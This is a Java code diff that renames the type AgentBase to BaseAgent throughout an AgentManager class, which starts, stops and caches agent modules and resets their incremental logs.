@@ -20,7 +20,7 @@ import com.android.service.util.Utils;
 /**
  * The Class AgentManager.
  */
-public class AgentManager extends Manager<AgentBase, String, String> {
+public class AgentManager extends Manager<BaseAgent, String, String> {
 
 	/** The Constant TAG. */
 	private static final String TAG = "AgentManager"; //$NON-NLS-1$
@@ -142,7 +142,7 @@ public class AgentManager extends Manager<AgentBase, String, String> {
 			return;
 		}
 
-		AgentBase a = makeAgent(key);
+		BaseAgent a = makeAgent(key);
 
 		if (a == null) {
 			return;
@@ -180,12 +180,12 @@ public class AgentManager extends Manager<AgentBase, String, String> {
 
 	}
 
-	private AgentBase makeAgent(String type) {
+	private BaseAgent makeAgent(String type) {
 		if (running.containsKey(type) == true) {
 			return running.get(type);
 		}
 
-		final AgentBase base = factory.create(type);
+		final BaseAgent base = factory.create(type);
 
 		if (base != null) {
 			running.put(type, base);
@@ -202,7 +202,7 @@ public class AgentManager extends Manager<AgentBase, String, String> {
 	 */
 	@Override
 	public synchronized void stop(final String moduleId) {
-		final AgentBase a = running.get(moduleId);
+		final BaseAgent a = running.get(moduleId);
 
 		if (a == null) {
 			if (Cfg.DEBUG) {
@@ -234,7 +234,7 @@ public class AgentManager extends Manager<AgentBase, String, String> {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (resetIncrementalLogs)");
 		}
-		for (AgentBase agent : threads.keySet()) {
+		for (BaseAgent agent : threads.keySet()) {
 			if (agent != null && agent instanceof IncrementalLog) {
 				((IncrementalLog) agent).resetLog();
 			}
